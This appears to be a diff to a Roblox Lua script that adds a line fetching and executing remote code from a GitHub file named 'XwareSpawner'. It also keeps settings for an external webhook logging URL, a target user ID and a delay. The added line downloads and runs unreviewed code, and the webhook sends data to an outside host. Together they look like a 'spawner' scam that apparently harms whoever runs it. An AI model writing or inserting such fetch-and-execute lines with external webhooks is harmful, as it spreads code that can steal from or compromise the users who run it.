@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))()
+
+
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_69201cb343644b71a9b62af1bbad7be2"
 getgenv().TARGET_ID = 7687372922
 getgenv().DELAY_STEP = 1      
